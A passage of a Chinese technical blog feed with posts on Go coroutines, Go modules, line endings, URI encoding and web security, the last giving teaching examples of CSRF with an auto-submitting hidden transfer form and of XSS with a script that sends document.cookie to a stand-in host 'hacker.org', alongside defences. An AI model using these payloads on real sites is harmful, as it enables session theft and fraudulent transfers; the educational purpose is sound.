<p>Go 的调度器使用 m:n 调度，其中 m 是 goroutine 数，n 是活跃线程数（由 GOMAXPROCS 决定，默认等于处理器核心数）。当一个 goroutine 陷入休眠或阻塞在一次管道通信上，调度器会把它的状态设为 <code>_Gwaiting</code> 并解除它与线程的绑定（相当于让出线程，随后就可以执行一次 goroutine 调度），等待状态的 goroutine 不占用线程；而如果 goroutine 阻塞在一次 IO 或其它系统调用上调度器会更新 goroutine 状态为 <code>_Gsyscall</code> 并解除线程和处理器的绑定（相当于让出处理器，这样处理器就可以绑定到其它线程上。这个过程触发一次线程切换的系统调用）。</p>
<p>以 go 为例，在一个线程里面开启多个协程：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> wg = sync.WaitGroup&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">        wg.Add(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(n <span class="keyword">int</span>)</span></span> &#123;    <span class="comment">// 开启一个新的协程</span></span><br><span class="line">            <span class="keyword">defer</span> wg.Done()</span><br><span class="line">            fmt.Printf(<span class="string">&quot;%v: Hello World!\n&quot;</span>, n)</span><br><span class="line">        &#125;(i)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>协程的优点：</p>
<ol>
<li>创建成本低。在 go 里每个协程大约只占用 1k 的内存。</li>
<li>调度成本低。协程属于用户态，不需要经过操作系统管理，调度时<strong>不需要陷入内核</strong>。</li>
<li>减少上锁频率。因为协程都是跑在一个线程里的，且都是非抢占式调度，所以不用担心指令执行到一半被夺去运行权限的问题。但是如果协程间存在竞争，并不能保证临界区，所以也不是完全不需要锁。</li>
</ol>
<p>协程的缺点：</p>
<ol>
<li>无法充分利用多核资源，因为所有协程都是属于一个线程的，协程需要和进程配合才能运行在多核 CPU 上</li>
<li>执行线程级的阻塞操作会阻塞掉整个程序</li>
</ol>
<h2 id="进程、线程和协程的调度成本对比"><a href="#进程、线程和协程的调度成本对比" class="headerlink" title="进程、线程和协程的调度成本对比"></a>进程、线程和协程的调度成本对比</h2><p>进程的切换带来以下<strong>直接开销</strong>：</p>
<ul>
<li>陷入内核</li>
<li>切换页表，刷新 TLB</li>
<li>保存寄存器值等硬件上下文</li>
<li>更新 PCB 中的信息（改掉进程的“运行态”），把 PCB 放入相关的状态队列</li>
</ul>
<p>此外还有由于 Cache 大规模失效带来的<strong>间接开销</strong>，即原进程缓存下来的指令和数据统统失效，CPU 需要直接访问内存的频率增加。</p>
<p>与进程相比，线程切换的开销就小了很多，主要体现在省略了切换虚拟地址空间这一步：</p>
<ul>
<li>陷入内核</li>
<li>保存寄存器值等硬件上下文</li>
<li>更新 TCB 中的信息（改掉线程的“运行态”），把 TCB 放入相关的状态队列</li>
</ul>
<p>而协程的切换就更轻量级了，它干脆连内核态也不陷入了：</p>
<ul>
<li>保存寄存器值等硬件上下文</li>
<li>更新协程状态（改掉协程的“运行态”），把协程放入相关的状态队列</li>
</ul>
]]></content>
      <categories>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>并发编程</tag>
      </tags>
  </entry>
  <entry>
    <title>开始你的Go Module之路</title>
    <url>/2020/02/21/%E5%BC%80%E5%A7%8B%E4%BD%A0%E7%9A%84Go-Module%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<p>在 go 的历史上出现过一大批包管理工具，如 dep，vendor 等。自 go1.12 以来官方引入了 go module 来解决这个乱象。</p>
<h1 id="从-GOPATH-说起"><a href="#从-GOPATH-说起" class="headerlink" title="从 GOPATH 说起"></a>从 GOPATH 说起</h1><p>GOPATH 是最早的 go 包管理方案，安装 golang 之后需要配置两个环境变量 <code>GOROOT</code> 与 <code>GOPATH</code>, 前者是 go 安装目录，后者是开发者自定义的用于存放代码的地方。GOPATH 下存在三个目录：</p>
<ul>
<li>bin: 存放编译后的可执行文件</li>
<li>pkg: 存放 go 的链接文件(suffix = .a)</li>
<li>src: 存放源代码</li>
</ul>
<p>平时我们的项目就放在 src 下，每个项目一个文件夹。每当我们用 import 语句导入包，go 会从 <code>$GOROOT/src</code> 和 <code>$GOPATH/src</code> 查找匹配的目录。举个栗子，假设我的 GOPATH 是 E:\go，在 src 下创建一个项目 service，里面有个 main.go 文件和 test 包：</p>
<p><img src="https://i.loli.net/2020/02/21/B9VCsnjychDQTJ4.png" alt="service"></p>
<p>main.go 文件内容如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/ramya-rao-a/go-outline&quot;</span></span><br><span class="line">    <span class="string">&quot;./test&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// your code</span></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>fmt 是 go 自带的包，位于 $GOROOT/src/fmt；github.com/ramya-rao-a/go-outline 是第三方包，位于 $GOPATH/src/github.com/ramya-rao-a/go-outline；test 是自定义包，<code>.</code> 表示 mian.go 所在文件夹，位于 $GOPATH/src/service/test</p>
<h1 id="升级，Go-module！"><a href="#升级，Go-module！" class="headerlink" title="升级，Go module！"></a>升级，Go module！</h1><p>讲了一大堆，是时候进入正题了。前面讲利用 GOPATH 进行包管理这个方法是在是太麻烦了，每个项目都要配一个专属的 GOPATH，不然各个项目的包就会混在一起。</p>
<p>go1.12 后，设置环境变量 <code>GO111MODULE=on</code>，每个软件包都可以声明为一个 module。每个 module 的依赖包都会放在 $GOPATH/pkg/mod 下。如果没有设置 GOPATH 也没关系，go 会在用户的 $home 目录下创建一个 go 文件夹作为默认的 GOPATH</p>
<h2 id="声明-module"><a href="#声明-module" class="headerlink" title="声明 module"></a>声明 module</h2><p>modulename 是任意的。如果想把这个包发布出去，最好还是按 github.com/user/xxxx 的形式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">go mod init &lt;modulename&gt;</span><br></pre></td></tr></table></figure>

<p>举个栗子，还是那个 service 项目：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">go mod init github.com/yue-qiu/service</span><br></pre></td></tr></table></figure>

<p>现在，在这个项目里，github.com/yue-qiu/service 就是这个项目的根目录。main.go 改写为：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/ramya-rao-a/go-outline&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/yue-qiu/service/test&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// your code</span></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>go mod 命令提供了一系列与 module 相关的用法：</p>
<p><img src="https://i.loli.net/2020/02/22/qk9bN2IMT48OSza.png" alt="module"></p>
<ul>
<li>go mod download: 根据 go.mod 中的内容拉取依赖包到本地</li>
<li>go mod tidy: 根据项目的导入信息往 go.mod 中添加、删除依赖包记录。建议少用，因为它会自动把所有依赖包升级到最新版本</li>
<li>go mod graph: 打印项目的依赖关系图</li>
<li>go mod vendor: 将 go.mod 中记录的依赖包缓存到一个 vendor 目录，这样在没网的情况下也能编译项目了</li>
<li>go mod edit [flag]: [flag] 又分好几种：<ul>
<li>fmt: 格式化 go.mod</li>
<li>require=path@version or droprequire=path@version: 添加依赖 or 删除依赖</li>
<li>replace=oldpath=newpath or droprequire=oldpath: 替换依赖</li>
</ul>
</li>
</ul>
<p>这里重点说下 -replace 选项，因为在生产中经常遇到的一种情况是由于这样那样的原因我们需要 fork 一个私有仓库去改动第三方开源库，例如有个小哥针对 logrus 做了二次开发 github.com/gogap/logrus，这个时候就需要用 github.com/gogap/logrus 替换之前的第三方开源库 github.com/sirupsen/logrus，操作如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go mod edit -replace=<span class="string">&quot;github.com/sirupsen/logrus=github.com/gogap/logrus@v0.8.2&quot;</span></span><br><span class="line"></span><br><span class="line">$ cat go.mod</span><br><span class="line"></span><br><span class="line">module <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">go 1.12</span><br><span class="line"></span><br><span class="line">require github.com/sirupsen/logrus v1.4.2</span><br><span class="line"></span><br><span class="line">replace github.com/sirupsen/logrus =&gt; github.com/gogap/logrus v0.8.2</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>回车 or 换行？</title>
    <url>/2020/02/16/%E5%9B%9E%E8%BD%A6-or-%E6%8D%A2%E8%A1%8C%EF%BC%9F/</url>
    <content><![CDATA[<p>以前编程的时候一直没注意回车符与换行符的区别，只是大概知道一个是 \r 一个是 \n。今天心血来潮查了一下，发现这还蛮有趣的~</p>
<span id="more"></span>

<h2 id="回车"><a href="#回车" class="headerlink" title="回车"></a>回车</h2><p>原名 Carriage Return，ASCII 码 13。表示光标回到行首。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello\rworld&quot;</span>)</span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"><span class="comment">#   world</span></span><br></pre></td></tr></table></figure>

<h2 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h2><p>原名 Line Feed，ASCII 码 10。表示光标移动到下一行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello\nworld&quot;</span>)</span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"><span class="comment">#   hello</span></span><br><span class="line"><span class="comment">#   world</span></span><br></pre></td></tr></table></figure>

<h2 id="渊源"><a href="#渊源" class="headerlink" title="渊源"></a>渊源</h2><p>在计算机还没有出现之前，有一种叫做电传打字机（Teletype Model 33）的玩意，每秒钟可以打 10 个字符。但是它有一个问题，就是打完一行换行的时候，要用去 0.2 秒，正好可以打两个字符。要是在这0.2秒里面，又有新的字符传过来，那么这个字符将丢失。</p>
<p><img src="https://i.loli.net/2020/02/16/kMxhL2pTCwBZASi.png" alt="打字机"></p>
<p>于是，研制人员想了个办法解决这个问题，就是在每行后面加两个表示结束的字符。一个叫做“回车”，告诉打字机把打印头定位在左边界；另一个叫做“换行”，告诉打字机把纸向下移一行。<br>这就是“换行”和“回车”的来历，从它们的英语名字上也可以看出一二。至于为什么回车在前换行在后呢？因为回车需要的时间更长，机器可以利用这个间隙完成换行操作。</p>
<p>后来，计算机发明了，这两个概念也就被般到了计算机上。那时，存储器很贵，一些科学家认为在每行结尾加两个字符太浪费了。于是，就出现了分歧：</p>
<ul>
<li>\r\n: Windows 系统行末结束符</li>
<li>\r: Mac 系统行末结束符</li>
<li>\n: Unix 系统行末结束符</li>
</ul>
<p>一个直接后果是，Unix/Mac 系统下的文件在 Windows 里打开的话，所有文字会变成一行；而 Windows 里的文件在 Unix/Mac 下打开的话，在每行的结尾可能会多出一个 ^M 符号。</p>
<p>总结：虽然不同操作系统对行末结束符的定义不同，但 \r\n 是历史传统而且被多个标准（如 HTTP，SMTP）所采纳，所以实际使用中还是以 \r\n 居多。</p>
]]></content>
      <categories>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>编码</tag>
      </tags>
  </entry>
  <entry>
    <title>网络那些事之URI</title>
    <url>/2020/02/13/URI%E4%B8%8EURL/</url>
    <content><![CDATA[<h1 id="什么是-URI"><a href="#什么是-URI" class="headerlink" title="什么是 URI"></a>什么是 URI</h1><p>URI(Uniform Resource Identifier)：统一资源标识符，用于<strong>唯一标识一个资源</strong>。</p>
<p>URL(Uniform Resource Locator)：统一资源定位符，表明在一个资源在网络中的访问方式。通常表现为 <code>协议+路径+参数</code></p>
<p>URN(Uniform Resource Name)：统一资源定位名称，通过某个命名空间中的唯一 ID 来标识一个资源</p>
<p><img src="https://i.loli.net/2020/02/13/2XjAU6Phz9ONJQq.png" alt="URI"></p>
<p>举个例子：小红的学号是 123456，这个学号就是 URN，能对应到小红这个人；小红的家庭住址是翻斗大街翻斗花园二号楼一零零一室，这个地址就是 URL，去那里就能找到小红。小红的学号、小红的住址都属于 URI。</p>
<h1 id="URI-的格式"><a href="#URI-的格式" class="headerlink" title="URI 的格式"></a>URI 的格式</h1><p>一个标准的 URI 格式为：<code>[scheme:]scheme-specific-part</code>，如：<a href="http://qiuyueqy.com/">http://qiuyueqy.com</a>, mailto:<a href="mailto:&#113;&#105;&#x75;&#121;&#x75;&#x65;&#57;&#x39;&#x37;&#49;&#x40;&#x31;&#x32;&#x36;&#x2e;&#x63;&#111;&#x6d;">&#113;&#105;&#x75;&#121;&#x75;&#x65;&#57;&#x39;&#x37;&#49;&#x40;&#x31;&#x32;&#x36;&#x2e;&#x63;&#111;&#x6d;</a>, news:comp.go.lang</p>
<p>URI 可以细分为为<code>不透明的(opaque)</code>和<code>分层的(hierarchical)</code>两类：</p>
<ul>
<li>opaque 指 scheme-specific-part 不以 / 开头，是一个整体。呈 [scheme]:opaque[?query][#fragment] 的形式。如：mailto:<a href="mailto:&#113;&#105;&#117;&#x79;&#117;&#x65;&#x39;&#x39;&#x37;&#49;&#64;&#x31;&#50;&#54;&#x2e;&#99;&#111;&#109;">&#113;&#105;&#117;&#x79;&#117;&#x65;&#x39;&#x39;&#x37;&#49;&#64;&#x31;&#50;&#54;&#x2e;&#99;&#111;&#109;</a>，<a href="http://www.google.com:443/">www.google.com:443</a>, opaque 必须是绝对的。</li>
<li>hierarchical 指 scheme-specific-part 以 / 开头且可以划分为好几部分。呈 [scheme:][//[userinfo@]host[:port]]path[?query][#fragment] 的形式。如：<a href="http://qiuyueqy.com/categories/">http://qiuyueqy.com/categories/</a>, hierarchical 可以是绝对的，也可以是相对的，如：<a href="https://github.com/yue-qiu/CUG_EmptyClassroom">https://github.com/yue-qiu/CUG_EmptyClassroom</a>, ../../static/verify.js</li>
</ul>
<h1 id="谈谈-URI-编码"><a href="#谈谈-URI-编码" class="headerlink" title="谈谈 URI 编码"></a>谈谈 URI 编码</h1><p>利用 URI 传参时，如果某些 URI 组件字符（如 /:?@&amp;=+$,#）同时也是参数的一部分会导致 URI 歧义。此外，URI 只支持 ASCII 编码，对于茫茫多的特殊字符（如：广东省）如何表示？</p>
<p>所谓办法总比困难多，为了解决这些问题，URI 编码应运而生。举个栗子，对下面这个未经编码的 URI：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://qiuyueqy.com/?page=2&amp;category=广东</span><br></pre></td></tr></table></figure>

<p>要表示特殊字符，我们把它按某个字符集（通常是 UTF-8）编码成十六进制的 %hh 形式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://qiuyueqy.com?page=2&amp;category=%E5%B9%BF%E4%B8%9C</span><br></pre></td></tr></table></figure>

<p>如果这个 URI 是另一个 URI 的参数，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">httpw://www.google.com?callback=http://qiuyueqy.com/?page=2&amp;category=广东</span><br></pre></td></tr></table></figure>

<p>显然，由于参数中 /、? 等组件字符的存在，上面这个 URI 的解释是有歧义的。这时，我们把整个回调 URI（包括它的组件字符）进行编码，再作为参数就没问题了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">httpw://www.google.com?callback=http%3A%2F%2Fqiuyueqy.com%2F%3Fpage%3D2%26category%3D%E5%B9%BF%E4%B8%9C</span><br></pre></td></tr></table></figure>

<h1 id="golang-对-URL-的实现"><a href="#golang-对-URL-的实现" class="headerlink" title="golang 对 URL 的实现"></a>golang 对 URL 的实现</h1><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> URL <span class="keyword">struct</span> &#123;</span><br><span class="line">    Scheme   <span class="keyword">string</span>    <span class="comment">//具体指访问服务器上的资源使用的哪种协议</span></span><br><span class="line">    Opaque   <span class="keyword">string</span>    <span class="comment">// 编码后的不透明数据</span></span><br><span class="line">    User     *Userinfo <span class="comment">// 用户名和密码信息,有些协议需要传入明文用户名和密码来获取资源，比如 FTP</span></span><br><span class="line">    Host     <span class="keyword">string</span>    <span class="comment">// host或host:port，服务器地址，可以是 IP 地址，也可以是域名信息</span></span><br><span class="line">    Path     <span class="keyword">string</span>  <span class="comment">//路径，使用&quot;/&quot;分隔</span></span><br><span class="line">    RawQuery <span class="keyword">string</span> <span class="comment">// 编码后的查询字符串，没有&#x27;?&#x27;</span></span><br><span class="line">    Fragment <span class="keyword">string</span> <span class="comment">// 引用的片段（文档位置），没有&#x27;#&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>应用层</tag>
      </tags>
  </entry>
  <entry>
    <title>网络那些事之网络安全</title>
    <url>/2020/02/06/%E7%BD%91%E7%BB%9C%E9%82%A3%E4%BA%9B%E4%BA%8B%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h2 id="网络安全的基本属性"><a href="#网络安全的基本属性" class="headerlink" title="网络安全的基本属性"></a>网络安全的基本属性</h2><ul>
<li>机密性：发送方加密，预定接收方解密</li>
<li>身份认证：发送方与预定接收方能确定彼此身份</li>
<li>完整性：信息不会被篡改，即使被篡改了也可以被检测出来</li>
</ul>
<h2 id="常见攻击手段"><a href="#常见攻击手段" class="headerlink" title="常见攻击手段"></a>常见攻击手段</h2><ul>
<li>映射（Mapping）：利用 ping 确定网络上运行主机的地址，再通过<strong>端口扫描</strong>依次尝试与每个端口建立 TCP 连接，找出主机在运行的服务</li>
<li>嗅探（sniffing）：在共享介质网络中，攻击方接收所有经过它的分组，层层解析后得到数据<br><img src="https://i.loli.net/2020/02/06/s8lqcjTVEtJ4f5M.png" alt="分组嗅探"></li>
<li>IP 欺骗：修改分组的源 IP 地址，冒充发送方</li>
<li>拒绝服务（DoS）：向接收方恶意泛洪分组，淹没接收方（带宽耗尽、资源耗尽）<br><img src="https://i.loli.net/2020/02/06/CearKxmuZjUF1fz.png" alt="DDoS"><br><img src="https://i.loli.net/2020/02/06/TgOkCnZjJm1BEwX.png" alt="反射DDos"></li>
<li>中间人攻击：对源主机伪装成目的主机，对目的主机伪装成源主机</li>
</ul>
<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。</p>
<p>因为浏览器在访问网站的时候会自动带上 cookie，攻击者通过发送跨站请求使用户在不知不觉中在另一个网站完成某种操作。这种攻击就称为 CSRF。</p>
<p><img src="https://i.loli.net/2020/06/04/svxj1aRo9idAtgK.png" alt="CSRF"></p>
<p>由此可见，要完成一次 CSRF，受害者需要经历一下两步：</p>
<ol>
<li>登录受信任网站 A，并在本地生成 Cookie。</li>
<li>在不登出 A 的情况下，访问危险网站 B</li>
</ol>
<p>举个例子：</p>
<p>银行网站 A，它以 post 请求来完成银行转账的操作，如：<code>http://www.mybank.com/Transfer.php</code></p>
<p>危险网站B，它里面有一段 HTML代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">　　　　　　<span class="function"><span class="keyword">function</span> <span class="title">steal</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="javascript">　　　　　　</span>&#123;</span></span><br><span class="line"><span class="javascript">          　　　　 iframe = <span class="built_in">document</span>.frames[<span class="string">&quot;steal&quot;</span>];</span></span><br><span class="line"><span class="javascript">　　     　　      iframe.document.Submit(<span class="string">&quot;transfer&quot;</span>);</span></span><br><span class="line"><span class="javascript">　　　　　　&#125;</span></span><br><span class="line"><span class="javascript">　　　　</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">　　<span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;steal()&quot;</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;steal&quot;</span> <span class="attr">display</span>=<span class="string">&quot;none&quot;</span>&gt;</span></span><br><span class="line">　　　　　　<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">name</span>=<span class="string">&quot;transfer&quot;</span>　<span class="attr">action</span>=<span class="string">&quot;http://www.myBank.com/Transfer.php&quot;</span>&gt;</span></span><br><span class="line">　　　　　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;toBankId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;11&quot;</span>&gt;</span></span><br><span class="line">　　　　　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;money&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">　　　　　　<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果用户先访问 A 再访问 B，那么点击了这个危险连接之后用户就少了 1000 块！因为访问 B 之前已经登录了 A，而 B 背地里暗搓搓地向 A 发出 post 请求，所以浏览器会带上 A 的 Cookie 去向 <code>http://www.mybank.com/Transfer.php</code> 发出请求，结果银行网站服务器收到请求后，认为这是一个转账操作，所以就立刻进行转账操作……</p>
<p>如何进行防护：</p>
<ul>
<li>为每个表单添加一个隐藏字段保存伪随机数 token，接收表单时先验证 token 合法性，这样攻击者就无法伪造 post 请求了</li>
<li>提交表单需要验证码。其实这样和用 token 差不多，只不过一个在明一个在暗</li>
<li>验证 Referer 头部</li>
</ul>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>XSS 全称是 Cross site script，即跨站脚本，为避免与 CSS 混淆简称 XSS。</p>
<p>攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到 web 页面中。使别的用户访问页面都会执行相应的嵌入代码。从而盗取用户 cookie、对访问者进行病毒侵害的一种攻击方式。</p>
<p>把代码嵌入网页的场景其实很常见。想象一个这样的场景：用户在某个论坛回帖，他回复的内容就会嵌入到这个网页中去。如果服务器不对用户的输入做过滤，一旦回复的内容是一段有恶意的代码，这段代码就会影响所有访问这个网页的人。</p>
<h4 id="反射性-XSS"><a href="#反射性-XSS" class="headerlink" title="反射性 XSS"></a>反射性 XSS</h4><p>又称为非持久性跨站点脚本攻击，它是最常见的 XSS，特征是攻击者注入的数据反应在响应中。一个典型的非持久性 XSS 包含一个带 XSS 攻击向量的链接(即每次攻击需要用户的点击)</p>
<p>举个例子：正常情况下，用户访问 <code>http://example.org?search=hello</code> 会显示 search 参数的值即 “hello”。然而，一旦攻击者把这样的地址嵌入到网页中 <code>http://example.org?search=&lt;script&gt;src=&#39;http://hacker.com/xss.js&#39;&lt;/script&gt;</code>，请求响应中就会包含并执行这样一段 js 代码 <code>&lt;script&gt;src=&#39;http://hacker.com/xss.js&#39;&lt;/script&gt;</code>，一旦 xss.js 包含了恶意操作，用户信息就被泄露了。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// xss.js 文件中的代码</span></span><br><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">img.width = <span class="number">0</span>;</span><br><span class="line">img.height = <span class="number">0</span>;</span><br><span class="line">img.src = <span class="string">&#x27;http://hacker.org/xss?cookie=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(<span class="built_in">document</span>.cookie); <span class="comment">// 窃取用户 cookie</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h4 id="存储性-XSS"><a href="#存储性-XSS" class="headerlink" title="存储性 XSS"></a>存储性 XSS</h4><p>又称为持久型跨站点脚本。与反射性 XSS 靠用户点击触发不同，存储性 XSS 把攻击脚本存储在网页中，每次用户访问这个网页都会自动执行恶意代码进行攻击。</p>
<p>举个例子：用户在留言板中正常回复是这样的</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">“text”</span> <span class="attr">name</span>=<span class="string">“content”</span> <span class="attr">value</span>=<span class="string">“这里是用户填写的数据”</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>服务器把 value 储存在数据库中，这样每次用户访问这个页面都可以看到这条回复。而攻击者可以在 value 中填入以下内容：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">哈哈哈，有趣有趣</span><br><span class="line">&lt;script&gt;src=<span class="string">&#x27;http://hacker.com/xss.js&#x27;</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>如果服务器也把这段代码入库并且嵌入到网页，那么每当用户访问访问这条留言都会执行 xss.js 中的代码。</p>
<p>如何进行防护：</p>
<ul>
<li>设置 Cookie 的属性为 <code>Http only</code>，这样 js 就无法获取 Cookie 值</li>
<li>严格检查表单提交的类型。比如 age 字段一定要是数字</li>
<li>过滤或移除特殊的 HTML 标签，如 <code>&lt;script&gt;</code>、<code>&lt;iframe&gt;</code></li>
<li>对用户提交的数据就行 <code>Html Encode</code> 处理，将其转换为 HTML 实体字符的普通文本。比如 <code>&lt;</code> 转换为 <code>&amp;lt</code>，<code>&quot;</code> 转换为 <code>&amp;quot</code></li>
</ul>
<h3 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h3><p>拒绝服务攻击即是攻击者想办法让目标机器停止提供服务，只要能够对目标造成麻烦，使某些服务被暂停甚至主机死机，都属于拒绝服务攻击。</p>
<p>拒绝服务攻击问题一直得不到合理的解决，究其原因是因为网络协议本身的安全缺陷，从而拒绝服务攻击也成为了攻击者的终极手法。攻击者进行拒绝服务攻击，实际上让服务器实现两种效果：一是迫使服务器的缓冲区满，不接收新的请求；二是使用IP欺骗，迫使服务器把非法用户的连接复位，影响合法用户的连接。</p>
<h4 id="SYN-洪水攻击"><a href="#SYN-洪水攻击" class="headerlink" title="SYN 洪水攻击"></a>SYN 洪水攻击</h4><p>SYN Flood 是一种广为人知的攻击，因为现在建立 TCP 连接都要经历都是采用三次握手所以对现代网络不太有效。</p>
<p>SYN Flood 攻击目前有两种方法，都与服务器没收到 ACK 有关。恶意用户可以跳过传送最后的 ACK 信息或者在 SYN 里通过欺骗来源 IP 地址，让服务器送 SYN-ACK 到假的 IP 地址，因此永不可能收到 ACK。大量半开状态的 TCP 连接占用了服务器全部资源，正常用户的访问被拒绝。</p>
<p>防御 SYN Flood 有几种简单的办法：</p>
<ol>
<li>缩短 SYN Timeout 时间：由于 SYN Flood 攻击的效果取决于服务器上保持的 SYN 半连接数，这个值等于 SYN 攻击的频度 × SYN Timeout，所以通过缩短 SYN 半连接状态的时间可以大大降低服务器压力。</li>
<li>设置 SYN Cookie：设置 SYN Cookie 就是给每一个请求连接的 IP 地址分配一个 Cookie，如果短时间内连续受到某个 IP 的重复 SYN 报文，就认定是受到了攻击，以后从这个 IP 地址发来的包会被丢弃。</li>
</ol>
<p>上述的两种方法只能对付比较原始的 SYN Flood，缩短 SYN Timeout 时间仅会在对方攻击频度不高的情况下生效，SYN Cookie 更依赖于对方使用真实的 IP 地址，如果攻击者以数万/秒的速度发送 SYN 报文，同时利用 SOCK_RAW 随机改写 IP 报文中的源地址，以上的方法将毫无用武之地。</p>
<h4 id="哈希洪水攻击"><a href="#哈希洪水攻击" class="headerlink" title="哈希洪水攻击"></a>哈希洪水攻击</h4><p>使用拉链法实现的 hash 表最坏情况下插入 n 个值的时间复杂度为 O(n^2)。既然如此，如果攻击者掌握了服务器使用的散列函数背后的实现原理，就可以轻易构建出一批具有相同散列码的值，让服务器把资源全部耗费在 hash 表的插入操作上。依 2011 年的实验数据，攻击一台基于 Java（Tomcat）的服务器时，仅仅需要 6KB/s 的流量就能打瘫一颗 Intel i7 处理器，1GB/s 的流量可以打瘫 100000 颗 Intel i7 处理器，性价比远超 TCP 半开连接等传统的拒绝服务攻击。</p>
